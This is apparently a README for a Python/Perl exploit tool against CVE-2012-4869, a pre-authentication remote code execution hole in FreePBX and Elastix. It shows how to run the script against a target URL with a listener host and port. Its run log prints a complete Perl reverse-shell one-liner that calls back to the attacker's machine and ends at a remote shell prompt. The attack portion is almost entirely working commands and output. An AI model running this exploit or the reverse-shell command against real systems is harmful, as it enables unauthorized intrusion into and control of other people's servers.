# CVE-2012-4869 - FreePBX / Elastix pre-authenticated remote code execution exploit

## Summary

The callme_startcall function in recordings/misc/callme_page.php in FreePBX 2.9, 2.10, and earlier allows remote attackers to execute arbitrary commands via the callmenum parameter in a c action.

## Note 

Wrote both python and perl support for shell as the perl one was not as user friendly as I liked. However when rewrote the perl 
shell with the -i flag it is now ok.

## Usage

```sh
⬢  CVE-2012-4869_FreePBX_Elastix_RCE  master ⦿ ./elastic_rce.py                                         

▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄   ██▀███   ▄████▄  ▓█████ 
▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
 ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
   ░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░          ░░   ░ ░           ░   
   ░  ░    ░  ░     ░  ░      ░            ░  ░ ░         ░     ░ ░         ░  ░
                                              ░                 ░               
[nighter@nighter.se]
    
Usage: ./elastic_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./elastic_rce.py 'http://10.10.10.70' 10.11.0.xxx 1337 [1=python|2=perl]
```

## Run exploit

```sh
⬢  CVE-2012-4869_FreePBX_Elastix_RCE  master ⦿ ./elastic_rce.py 'https://10.11.1.xxx' 10.11.0.xxx 5555 2
[+] LHOST = 10.11.0.xxx                                                                                                                                                                                     
[+] LPORT = 5555                                                                                                 
[+] Netcat = 5555                                                                                                
[+] COMMAND: perl -MIO -e 'use Socket;$i="10.11.0.xxx";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
Connection from 10.11.1.xxx:58349                                                                                
sh: no job control in this shell                                                                                 
sh-3.2$ ls                              
```